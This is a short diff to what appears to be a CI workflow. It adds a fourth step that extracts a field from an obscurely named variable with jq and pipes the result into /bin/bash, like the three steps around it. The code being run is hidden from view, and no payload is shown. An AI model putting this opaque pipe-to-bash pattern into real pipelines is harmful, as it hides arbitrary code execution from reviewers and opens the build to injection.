@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$lruv77178" | jq -r .c0 | /bin/bash
           echo $pgb9233 | jq -r .ar26499 | /bin/bash
           printf '%s' "$c671" | jq -r .at109 | /bin/bash
+          echo $ef830 | jq -r .ioake08 | /bin/bash
 
       - name: Upload data
         if: always()
